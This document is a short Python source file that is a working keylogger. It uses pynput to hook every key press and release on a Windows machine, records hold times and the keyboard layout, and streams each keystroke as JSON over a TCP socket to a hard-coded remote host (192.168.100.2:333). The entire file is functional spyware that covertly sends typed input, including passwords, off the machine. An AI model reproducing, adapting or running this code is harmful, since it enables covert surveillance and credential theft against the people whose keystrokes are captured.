import ctypes
import socket
from pynput.keyboard import Key
from pynput import keyboard
import time

class Timer:
    def start(self):self.start_count = time.time()
    def stop(self):self.end_count = time.time()
    def get(self):return "%.4f" % (self.end_count - self.start_count)

REMOTE_HOST = '192.168.100.2'
REMOTE_PORT = 333
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#
def Shell_Send(data):
    conn.send(data.encode())

conn.connect((REMOTE_HOST, REMOTE_PORT))

def get_keyboard_language_id():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    return user32.GetKeyboardLayout(user32.GetWindowThreadProcessId(user32.GetForegroundWindow(), 0)) & (2 ** 16 - 1)

class Holded:
    shift = False
    # ctrl = False
KeyboardisReleased_timer = True
keyboard_timer = Timer()

def Pressed(key):
    global KeyboardisReleased_timer
    global data

    if KeyboardisReleased_timer:
        keyboard_timer.start()
        KeyboardisReleased_timer = False
    try:
        key = str(key.char).upper() if Holded.shift else str(key.char)
    except (AttributeError, TypeError):
        key = str(key).upper() if Holded.shift else str(key)
    key += '\\' if key == '\\' else ''
    Shell_Send('{"key": \"%s%s\", "action": "Press", "for": "-", "language": %i}' % ("\\" if key == '"' else '', key, get_keyboard_language_id()))

    if key is Key.shift:
        Holded.shift = True
def Released(key):
    global KeyboardisReleased_timer

    keyboard_timer.stop()
    try:
        key = str(key.char).upper() if Holded.shift else str(key.char)
    except (AttributeError, TypeError):
        key = str(key).upper() if Holded.shift else str(key)
    key += '\\' if key == '\\' else ''
    Shell_Send('{"key": \"%s%s\", "action": "Release", "for": "%s", "language": %i}' % ("\\" if key == '"' else '', key, keyboard_timer.get(), get_keyboard_language_id()))
    if key is Key.shift:
        Holded.shift = False
    KeyboardisReleased_timer = True
with keyboard.Listener(on_press=Pressed, on_release=Released) as vl:
    vl.join()